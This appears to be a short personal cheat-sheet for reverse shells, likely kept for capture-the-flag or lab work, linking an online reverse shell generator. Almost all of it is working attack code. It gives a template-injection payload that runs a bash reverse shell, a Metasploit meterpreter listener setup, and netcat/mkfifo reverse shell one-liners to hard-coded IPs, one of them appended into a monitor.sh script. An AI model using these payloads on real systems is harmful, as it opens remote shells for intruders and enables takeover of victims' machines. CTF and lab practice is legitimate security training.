
```embed
title: "Online - Reverse Shell Generator"
image: "https://user-images.githubusercontent.com/58673953/111243529-9d646f80-85d7-11eb-986c-9842747dc2e7.png"
description: "Online Reverse Shell generator with Local Storage functionality, URI & Base64 Encoding, MSFVenom Generator, and Raw Mode. Great for CTFs."
url: "https://www.revshells.com/"
```

```php
{{ ["bash -c 'exec bash -i >& /dev/tcp/10.10.239.163/4445 0>&1'", ""] | sort('passthru') }}
```

Start meterpreter listener Kali MSF
#rev_shell
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST
set LPORT

exploit
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.28 9001 >/tmp/f

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.28 9001  | tee -a monitor.sh

```


